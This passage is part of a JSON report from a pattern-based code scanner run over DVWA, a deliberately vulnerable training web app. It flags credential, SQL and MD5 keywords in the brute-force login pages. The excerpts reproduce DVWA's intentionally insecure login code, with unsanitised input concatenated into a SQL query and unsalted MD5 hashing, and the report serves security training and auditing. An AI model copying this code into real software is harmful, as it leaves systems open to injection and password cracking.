        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 29,
        "startLocationColumn": 24,
        "endLocationLine": 29,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n",
        "startLocationLine": 9,
        "startLocationColumn": 18,
        "endLocationLine": 9,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 14,
        "startLocationColumn": 60,
        "endLocationLine": 14,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n",
        "startLocationLine": 23,
        "startLocationColumn": 31,
        "endLocationLine": 23,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( 2 );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 29,
        "startLocationColumn": 40,
        "endLocationLine": 29,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 14,
        "startLocationColumn": 12,
        "endLocationLine": 14,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 11,
        "startLocationColumn": 10,
        "endLocationLine": 11,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Get username\n\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 20,
        "endLocationLine": 3,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Get username\n\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n",
        "startLocationLine": 5,
        "startLocationColumn": 18,
        "endLocationLine": 5,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n",
        "startLocationLine": 8,
        "startLocationColumn": 18,
        "endLocationLine": 8,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 12,
        "startLocationColumn": 60,
        "endLocationLine": 12,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 21,
        "startLocationColumn": 31,
        "endLocationLine": 21,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 24,
        "endLocationLine": 26,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 40,
        "endLocationLine": 26,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 4,
        "endLocationLine": 18,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n",
        "startLocationLine": 18,
        "startLocationColumn": 19,
        "endLocationLine": 18,
        "endLocationColumn": 25
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 26,
        "endLocationLine": 22,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\nif( isset( $_GET[ &#39;Login&#39; ] ) ) {\n\t// Get username\n\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n",
        "startLocationLine": 5,
        "startLocationColumn": 18,
        "endLocationLine": 5,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 24,
        "endLocationLine": 26,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$user = $_GET[ &#39;username&#39; ];\n\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n",
        "startLocationLine": 8,
        "startLocationColumn": 18,
        "endLocationLine": 8,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 12,
        "startLocationColumn": 60,
        "endLocationLine": 12,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 21,
        "startLocationColumn": 31,
        "endLocationLine": 21,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Login failed\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 26,
        "startLocationColumn": 40,
        "endLocationLine": 26,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 12,
        "startLocationColumn": 12,
        "endLocationLine": 12,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\n\t// Get password\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = md5( $pass );\n\n\t// Check the database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 9,
        "startLocationColumn": 10,
        "endLocationLine": 9,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated.\n\t\t\tWith a little help of social engineering (such as sending a link via email/chat), an attacker may force the users of a web application to execute actions of\n\t\t\tthe attacker&#39;s choosing.&lt;/p&gt;\n\n\t\t&lt;p&gt;A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is\n\t\t\tthe administrator account, this can compromise the entire web application.&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 125,
        "endLocationLine": 9,
        "endLocationColumn": 138
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
